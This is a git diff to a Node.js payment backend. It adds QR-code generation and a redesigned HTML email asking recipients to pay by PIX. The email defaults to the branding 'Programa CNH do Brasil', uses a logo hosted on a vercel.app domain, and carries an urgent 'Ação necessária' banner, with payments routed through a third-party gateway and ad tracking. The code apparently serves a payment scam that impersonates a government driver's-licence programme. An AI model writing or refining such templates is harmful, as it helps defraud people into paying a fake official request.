@@ -3,6 +3,7 @@
 
 const db = require("./_db");
 const nodemailer = require("nodemailer");
+const QRCode = require("qrcode");
 
 const BASE_URL = process.env.BLACKCAT_BASE_URL || "https://api.blackcatpagamentos.online/api";
 const UTMIFY_API_URL = "https://api.utmify.com.br/api-credentials/orders";
@@ -60,19 +61,90 @@ function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transact
   const safeTx = transactionId ? `Transação: ${transactionId}` : "";
   const hasQr = Boolean(qrCode);
   const qrImg = hasQr
-    ? `<div style="margin:16px 0; text-align:center;"><img src="${qrCode}" alt="QR Code PIX" style="max-width:220px; width:100%; height:auto;" /></div>`
+    ? `<div style="margin:12px auto 0; text-align:center;"><img src="${qrCode}" alt="QR Code PIX" style="max-width:220px; width:100%; height:auto;" /></div>`
     : "";
 
+  const logoUrl = process.env.PIX_EMAIL_LOGO_URL || "https://popseal.vercel.app/cnh-brasil-logo.png";
+  const headerTitle = process.env.PIX_EMAIL_HEADER_TITLE || "Programa CNH do Brasil";
+  const headerSubtitle = process.env.PIX_EMAIL_HEADER_SUBTITLE || "Inscrição ativa";
+  const buttonLabel = process.env.PIX_EMAIL_BUTTON_LABEL || "REALIZAR PAGAMENTO";
+
   return `
-  <div style="font-family:Arial, Helvetica, sans-serif; color:#111; line-height:1.4;">
-    <h2 style="margin:0 0 8px;">${safeTitle}</h2>
-    <p style="margin:0 0 12px;">${safeName}, seu PIX foi gerado com sucesso.</p>
-    <p style="margin:0 0 12px;"><strong>Valor:</strong> ${amount}</p>
-    ${safeTx ? `<p style="margin:0 0 12px;"><strong>${safeTx}</strong></p>` : ""}
-    ${qrImg}
-    <p style="margin:0 0 8px;"><strong>Código copia e cola:</strong></p>
-    <div style="padding:12px; background:#f5f5f5; border-radius:8px; word-break:break-all; font-size:14px;">${pixCode}</div>
-    <p style="margin:12px 0 0; font-size:12px; color:#666;">Se não reconhecer este pedido, desconsidere este email.</p>
+  <div style="margin:0; padding:0; background:#eef3f8; font-family:Arial, Helvetica, sans-serif; color:#0b0b0b; line-height:1.4;">
+    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background:#eef3f8; padding:24px 12px;">
+      <tr>
+        <td align="center">
+          <table role="presentation" cellpadding="0" cellspacing="0" width="520" style="max-width:520px; width:100%; background:#ffffff; border-radius:14px; overflow:hidden; box-shadow:0 8px 24px rgba(15, 23, 42, 0.08);">
+            <tr>
+              <td style="background:#0c2d57; padding:18px 20px; text-align:center;">
+                <img src="${logoUrl}" alt="Logo" style="max-height:44px; display:block; margin:0 auto 8px;" />
+                <div style="color:#ffffff; font-weight:700; font-size:16px;">${headerTitle}</div>
+                <div style="color:#c9d7f0; font-size:12px; margin-top:4px;">${headerSubtitle}</div>
+              </td>
+            </tr>
+            <tr>
+              <td style="padding:18px 20px 0;">
+                <div style="background:#fff5d6; border:1px solid #ffe1a3; color:#6b4b00; padding:10px 12px; border-radius:8px; font-size:12px;">
+                  Ação necessária, ${safeName}. Sua inscrição aguarda confirmação de pagamento.
+                </div>
+              </td>
+            </tr>
+            <tr>
+              <td style="padding:16px 20px 6px;">
+                <div style="font-size:12px; color:#5b6b82;">DADOS DO INSCRITO</div>
+                <div style="background:#f7f9fc; border:1px solid #e6eef7; padding:12px; border-radius:10px; margin-top:8px;">
+                  <div style="font-weight:600; font-size:14px;">${safeName}</div>
+                  ${safeTx ? `<div style="font-size:12px; color:#64748b; margin-top:4px;">${safeTx}</div>` : ""}
+                </div>
+              </td>
+            </tr>
+            <tr>
+              <td style="padding:8px 20px 0;">
+                <div style="background:#1f4fbf; border-radius:12px; padding:18px; text-align:center; color:#ffffff;">
+                  <div style="font-size:11px; letter-spacing:0.6px; opacity:0.85;">${safeTitle.toUpperCase()}</div>
+                  <div style="font-size:30px; font-weight:700; margin:6px 0 0;">${amount}</div>
+                </div>
+              </td>
+            </tr>
+            <tr>
+              <td style="padding:14px 20px 0; text-align:center;">
+                <a href="#" style="background:#1db954; color:#ffffff; text-decoration:none; padding:12px 18px; border-radius:10px; font-weight:700; display:inline-block; font-size:13px; letter-spacing:0.4px;">
+                  ${buttonLabel}
+                </a>
+                <div style="font-size:11px; color:#64748b; margin-top:8px;">Atenção: pagamento via PIX</div>
+              </td>
+            </tr>
+            <tr>
+              <td style="padding:18px 20px 0;">
+                <div style="font-weight:700; font-size:12px; color:#0f172a;">Ou copie o código PIX:</div>
+                <div style="margin-top:8px; padding:12px; background:#f8fafc; border:1px dashed #cbd5e1; border-radius:10px; font-size:12px; word-break:break-all; color:#1f2937;">${pixCode}</div>
+              </td>
+            </tr>
+            <tr>
+              <td style="padding:14px 20px 0;">
+                ${qrImg}
+              </td>
+            </tr>
+            <tr>
+              <td style="padding:14px 20px 20px;">
+                <div style="background:#e7f8ee; border:1px solid #bfe7d1; border-radius:10px; padding:12px; font-size:12px; color:#0f5132;">
+                  <div style="font-weight:700; margin-bottom:6px;">Como pagar via PIX:</div>
+                  <ol style="margin:0; padding-left:18px;">
+                    <li>Abra o app do seu banco</li>
+                    <li>Acesse a área PIX</li>
+                    <li>Clique em “Pagar” ou “Copia e Cola”</li>
+                    <li>Cole o código e confirme</li>
+                  </ol>
+                </div>
+                <div style="margin-top:12px; font-size:11px; color:#6b7280; text-align:center;">
+                  Se não reconhecer este pedido, desconsidere este email.
+                </div>
+              </td>
+            </tr>
+          </table>
+        </td>
+      </tr>
+    </table>
   </div>
   `;
 }
@@ -500,12 +572,21 @@ async function handlePaymentRequest(req, res) {
       platform: "Blackcat",
     });
 
+    let emailQrCode = pixQrWithPrefix || "";
+    if (!emailQrCode && pixText) {
+      try {
+        emailQrCode = await QRCode.toDataURL(String(pixText));
+      } catch (qrError) {
+        console.error("[PAYMENT] Falha ao gerar QR Code para email:", qrError.message || qrError);
+      }
+    }
+
     try {
       await sendPixEmail({
         to: customer.email,
         nome: customer.name,
         pixCode: String(pixText),
-        qrCode: pixQrWithPrefix || "",
+        qrCode: emailQrCode,
         amountCents: txData?.amount || amountCents,
         title: FIXED_TITLE,
         transactionId: String(tx),
